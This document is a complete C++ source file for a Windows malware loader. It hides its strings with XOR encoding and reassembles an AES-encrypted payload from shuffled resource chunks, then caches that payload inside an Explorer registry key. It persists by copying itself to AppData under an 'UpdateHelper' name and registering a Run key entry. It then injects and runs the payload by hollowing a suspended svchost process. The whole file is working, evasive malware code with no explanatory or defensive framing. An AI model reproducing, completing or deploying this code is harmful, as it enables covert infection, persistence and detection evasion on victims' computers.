#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <string>
#include <algorithm>
#include <random>
#include <shlwapi.h>
#include <shlobj.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define MVAL 0x474E5089

#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
    uint16_t shseed;
};
#pragma pack(pop)

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

unsigned char encCIDSizeMRU[] = {
    0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
    0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
    0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
    0xDA, 0xAC, 0xDC, 0xAE, 0xDE, 0x83, 0xE0, 0xA2, 0xE2, 0x96, 0xE4, 0x97, 0xE6, 0x95, 0xE8, 0x8C,
    0xEA, 0x85, 0xEC, 0x99, 0xEE, 0xB9, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0x86, 0xF6, 0x9E, 0xF8, 0x96,
    0xFA, 0x95, 0xFC, 0xA1, 0xFE, 0xBA, 0x00, 0x79, 0x02, 0x73, 0x04, 0x69, 0x06, 0x68, 0x08, 0x7B,
    0x0A, 0x6E, 0x0C, 0x7F, 0x0E, 0x53, 0x10, 0x52, 0x12, 0x7C, 0x14, 0x78, 0x16, 0x53, 0x18, 0x75,
    0x1A, 0x7C, 0x1C, 0x2E, 0x1E, 0x2D, 0x20, 0x7D, 0x22, 0x60, 0x24, 0x6C, 0x26, 0x63, 0x28, 0x7A,
    0x2A, 0x42, 0x2C, 0x57, 0x2E, 0x4A, 0x30, 0x7C, 0x32, 0x61, 0x34, 0x60, 0x36, 0x37
};
unsigned char encRunKey[] = {
    0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
    0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
    0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
    0xDA, 0xAC, 0xDC, 0xAE, 0xDE, 0x83, 0xE0, 0xA2, 0xE2, 0x96, 0xE4, 0x97, 0xE6, 0x95, 0xE8, 0x8C,
    0xEA, 0x85, 0xEC, 0x99, 0xEE, 0xB9, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0x86, 0xF6, 0x9E, 0xF8, 0x96,
    0xFA, 0x95, 0xFC, 0xA1, 0xFE, 0xAD, 0x00, 0x74, 0x02, 0x6D, 0x04, 0x05
};

unsigned char encSvchostPath[] = {
    0xAA, 0xE8, 0xAC, 0x97, 0xAE, 0xF3, 0xB0, 0xE6, 0xB2, 0xDA, 0xB4, 0xDB, 0xB6, 0xD3, 0xB8, 0xD6,
    0xBA, 0xCC, 0xBC, 0xCE, 0xBE, 0xE3, 0xC0, 0x92, 0xC2, 0xBA, 0xC4, 0xB6, 0xC6, 0xB3, 0xC8, 0xAC,
    0xCA, 0xA6, 0xCC, 0xFE, 0xCE, 0xFD, 0xD0, 0x8D, 0xD2, 0xA0, 0xD4, 0xA3, 0xD6, 0xB4, 0xD8, 0xB1,
    0xDA, 0xB4, 0xDC, 0xAE, 0xDE, 0xAB, 0xE0, 0xCF, 0xE2, 0x86, 0xE4, 0x9D, 0xE6, 0x82, 0xE8, 0xE9
};

unsigned char encUpdateHelper[] = {
    0xAA, 0xE6, 0xAC, 0xC4, 0xAE, 0xCC, 0xB0, 0xC3, 0xB2, 0xDC, 0xB4, 0xC6, 0xB6, 0xD8, 0xB8, 0xDF,
    0xBA, 0xCF, 0xBC, 0xE1, 0xBE, 0xE8, 0xC0, 0xA8, 0xC2, 0xAD, 0xC4, 0xA1, 0xC6, 0xA8, 0xC8, 0xBE,
    0xCA, 0xB8, 0xCC, 0x91, 0xCE, 0x9A, 0xD0, 0xA1, 0xD2, 0xB7, 0xD4, 0xB4, 0xD6, 0xA3, 0xD8, 0xBC,
    0xDA, 0x93, 0xDC, 0xB8, 0xDE, 0xB3, 0xE0, 0x91, 0xE2, 0x86, 0xE4, 0x97, 0xE6, 0xE7
};

unsigned char encUpdateHelperName[] = {
    0xAA, 0xFC, 0xAC, 0xC4, 0xAE, 0xC1, 0xB0, 0xD5, 0xB2, 0xDC, 0xB4, 0xC2, 0xB6, 0xC4, 0xB8, 0xEC,
    0xBA, 0xCB, 0xBC, 0xD9, 0xBE, 0xDE, 0xC0, 0xB5, 0xC2, 0xA6, 0xC4, 0x8D, 0xC6, 0xA2, 0xC8, 0xA5,
    0xCA, 0xBB, 0xCC, 0xA8, 0xCE, 0xBD, 0xD0, 0xD1
};

unsigned char encExplorer[] = {
    0xAA, 0xEE, 0xAC, 0xD5, 0xAE, 0xDF, 0xB0, 0xDD, 0xB2, 0xDC, 0xB4, 0xC7, 0xB6, 0xD2, 0xB8, 0xCB,
    0xBA, 0xBB
};

unsigned char encFolderFile[] = {
    0xAA, 0xE6, 0xAC, 0xC4, 0xAE, 0xCC, 0xB0, 0xC3, 0xB2, 0xDC, 0xB4, 0xC6, 0xB6, 0xD8, 0xB8, 0xDF,
    0xBA, 0xCF, 0xBC, 0xE1, 0xBE, 0xE8, 0xC0, 0xA8, 0xC2, 0xAD, 0xC4, 0xA1, 0xC6, 0xA8, 0xC8, 0xBE,
    0xCA, 0xB8, 0xCC, 0x91, 0xCE, 0x98, 0xD0, 0xB8, 0xD2, 0xBD, 0xD4, 0xB1, 0xD6, 0xB8, 0xD8, 0xAE,
    0xDA, 0xA8, 0xDC, 0x88, 0xDE, 0xAF, 0xE0, 0x85, 0xE2, 0x82, 0xE4, 0x91, 0xE6, 0x82, 0xE8, 0xA1,
    0xEA, 0x8E, 0xEC, 0x81, 0xEE, 0x9F, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0xDB, 0xF6, 0x92, 0xF8, 0x81,
    0xFA, 0x9E, 0xFC, 0xFD
};

unsigned char encRegValue[] = {
    0xAA, 0xFC, 0xAC, 0xC4, 0xAE, 0xC1, 0xB0, 0xD5, 0xB2, 0xDC, 0xB4, 0xC2, 0xB6, 0xC4, 0xB8, 0xEC,
    0xBA, 0xCB, 0xBC, 0xD9, 0xBE, 0xDE, 0xC0, 0xB5, 0xC2, 0xA6, 0xC4, 0x8D, 0xC6, 0xA2, 0xC8, 0xA5,
    0xCA, 0xBB, 0xCC, 0xA8, 0xCE, 0xBD, 0xD0, 0xD1
};

std::wstring GetDecryptedWString(const unsigned char* encryptedData, size_t dataLen, unsigned char key = 0xAA) {
    std::vector<wchar_t> result;
    for (size_t i = 0; i + 1 < dataLen; i += 2) {
        unsigned char b1 = encryptedData[i]     ^ (key + static_cast<unsigned char>(i));
        unsigned char b2 = encryptedData[i + 1] ^ (key + static_cast<unsigned char>(i + 1));
        wchar_t wc = (static_cast<wchar_t>(b1) << 8) | b2;
        if (wc == L'\0') break;
        result.push_back(wc);
    }
    result.push_back(L'\0');
    return std::wstring(result.begin(), result.end());
}

static const char* resTypeRCDATA = "RCDATA";

unsigned char* LoadResBID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resTypeRCDATA);
    if (!hRes) return nullptr;
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;
    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    if (pbuf.size() != esize) {
        return false;
    }
    if (CalCR32(pbuf.data(), pbuf.size()) != ecrc) {
        return false;
    }
    return true;
}

bool RegFE() {
    HKEY hKey;
    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
    DWORD size = 0;
    bool indexExists = (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return indexExists;
}

bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) {

    HKEY hKey;
    DWORD disposition;
    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
    if (RegCreateKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        return false;
    }

    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
    if (RegSetValueExW(hKey, iName.c_str(), 0, REG_BINARY, (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    for (size_t i = 0; i < eChks.size(); ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY, eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }
    }

    RegCloseKey(hKey);
    return true;
}

std::vector<char> LoadFFR() {

    HKEY hKey;
    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return {};
    }

    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
    DWORD size = sizeof(PIndex);
    PIndex index;
    if (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {};
    }

    if (index.mval != MVAL) {
        RegCloseKey(hKey);
        return {};
    }
    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.ccount);
    for (int i = 0; i < index.ccount; ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        DWORD chunkSize = 0;
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return {};
        }
        shuffledEncryptedChunks[i].resize(chunkSize);
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return {};
        }
    }

    RegCloseKey(hKey);

    std::vector<int> chunk_order(index.ccount);
    for (int i = 0; i < index.ccount; ++i) chunk_order[i] = i;
    std::mt19937 rng(index.shseed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);

    std::vector<std::vector<BYTE>> eChks(index.ccount);
    for (int registry_pos = 0; registry_pos < index.ccount; ++registry_pos) {
        int logical_idx = chunk_order[registry_pos];
        eChks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
    }
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};

    for (int i = 0; i < index.ccount; ++i) {
        const auto& encrypted_data = eChks[i];
        DWORD chunk_size = (DWORD)encrypted_data.size();

        BYTE iv[16] = {0};
        if (i > 0) memcpy(iv, last_cipher_block, 16);

        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};
        keyblob.hdr.bType = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize = 32;
        memcpy(keyblob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        std::vector<BYTE> decbuf(chunk_size);
        memcpy(decbuf.data(), encrypted_data.data(), chunk_size);
        DWORD out_len = chunk_size;

        if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        CryptDestroyKey(hKey);

        if (chunk_size >= 16) {
            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
        }

        if (out_len > 0) {
            BYTE pad = decbuf[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decbuf[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) out_len -= pad;
            }
        }

        pbuf.insert(pbuf.end(), (char*)decbuf.data(), (char*)decbuf.data() + out_len);
    }

    CryptReleaseContext(hProv, 0);

    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }

    return pbuf;
}

std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    if (!idata || iSize < sizeof(PIndex)) {
        return {};
    }
    PIndex* idx = (PIndex*)idata;
    if (idx->mval != MVAL) {
        return {};
    }
    std::vector<std::vector<BYTE>> shEChks;
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        DWORD chksize = 0;
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
        } else {
            return {};
        }
    }
    if (shEChks.size() != idx->ccount) {
        return {};
    }
    std::vector<int> chkOrdr(idx->ccount);
    for (int i = 0; i < idx->ccount; ++i) chkOrdr[i] = i;
    std::mt19937 rng(idx->shseed);
    std::shuffle(chkOrdr.begin(), chkOrdr.end(), rng);
    std::vector<std::vector<BYTE>> eChks(idx->ccount);
    for (int r_pos = 0; r_pos < idx->ccount; ++r_pos) {
        int log_idx = chkOrdr[r_pos];
        eChks[log_idx] = std::move(shEChks[r_pos]);
    }
    return {*idx, eChks};
}

bool CheckPersistence() {
    std::wstring runKeyPath = GetDecryptedWString(encRunKey, sizeof(encRunKey));
    std::wstring regValueName = GetDecryptedWString(encUpdateHelperName, sizeof(encUpdateHelperName));
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    DWORD size = 0;
    bool exists = (RegQueryValueExW(hKey, regValueName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return exists;
}

bool CopySTPL() {
    std::wstring runKeyPath = GetDecryptedWString(encRunKey, sizeof(encRunKey));
    std::wstring regValueName = GetDecryptedWString(encUpdateHelperName, sizeof(encUpdateHelperName));
    std::wstring folderFile = GetDecryptedWString(encUpdateHelper, sizeof(encUpdateHelper));
    wchar_t currentPath[MAX_PATH], appDataPath[MAX_PATH], targetPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    wcscpy_s(targetPath, appDataPath);
    PathAppendW(targetPath, folderFile.c_str());
    wchar_t dirPath[MAX_PATH];
    wcscpy_s(dirPath, targetPath);
    PathRemoveFileSpecW(dirPath);
    SHCreateDirectoryExW(NULL, dirPath, NULL);
    if (_wcsicmp(currentPath, targetPath) != 0) {
        if (CopyFileW(currentPath, targetPath, FALSE)) {
        } else {
        }
    }
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        std::wstring value = L"\"" + std::wstring(targetPath) + L"\"";
        if (RegSetValueExW(hKey, regValueName.c_str(), 0, REG_SZ,
                           (BYTE*)value.c_str(), (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

std::vector<char> RecFWRP() {
    if (!CheckPersistence()) {
        CopySTPL();
    } else {
    }
    if (RegFE()) {
        auto rPBuf = LoadFFR();
        if (!rPBuf.empty()) {
            return rPBuf;
        }
    }
    auto [index, enChksLog] = LoadEFR();
    if (enChksLog.empty()) {
        return {};
    }
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }
    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};
    for (int i = 0; i < index.ccount; ++i) {
        const auto& enc_buf = enChksLog[i];
        DWORD chk_s = (DWORD)enc_buf.size();
        BYTE iv[16] = {0};
        if (i > 0) memcpy(iv, last_cipher_block, 16);
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};
        keyblob.hdr.bType = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize = 32;
        memcpy(keyblob.key, aes_key, 32);
        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            CryptReleaseContext(hProv, 0);
            return {};
        }
        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        std::vector<BYTE> dec(chk_s);
        memcpy(dec.data(), enc_buf.data(), chk_s);
        DWORD out_len = chk_s;
        if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        CryptDestroyKey(hKey);
        if (chk_s >= 16) memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
        if (out_len > 0) {
            BYTE pad = dec[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (dec[out_len - 1 - j] != pad) { valid = false; break; }
                }
                if (valid) out_len -= pad;
            }
        }
        pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
    }
    CryptReleaseContext(hProv, 0);
    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }
    StoreFIR(index, enChksLog);
    return pbuf;
}

bool Start(char* payload, uint32_t payloadSize) {
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_lfanew < sizeof(IMAGE_DOS_HEADER) || dos->e_lfanew > payloadSize - sizeof(IMAGE_NT_HEADERS64)) {
        return false;
    }
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    std::wstring hostPathW = GetDecryptedWString(encSvchostPath, sizeof(encSvchostPath));
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(NULL, (LPWSTR)hostPathW.c_str(), NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char err[256];
        return false;
    }
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)originalImageBase,
                                        nt->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    } else {
    }
    ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;
    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
        SIZE_T processed = 0;
        while (processed < relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);
            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }
            processed += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }
    nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);
        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);
        if (!WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written)) {
            delete[] padded;
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
        delete[] padded;
    }
    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
    static pNtQuery pNt = nullptr;
    if (!pNt) {
        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    }
    if (pNt) {
        PROCESS_BASIC_INFORMATION pbi = {};
        ULONG returnLength = 0;
        if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) == 0) {
            PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
            WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
        }
    }
    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
    if (!Start(pbuf.data(), (uint32_t)pbuf.size())) {
        return -1;
    }
    return 0;
}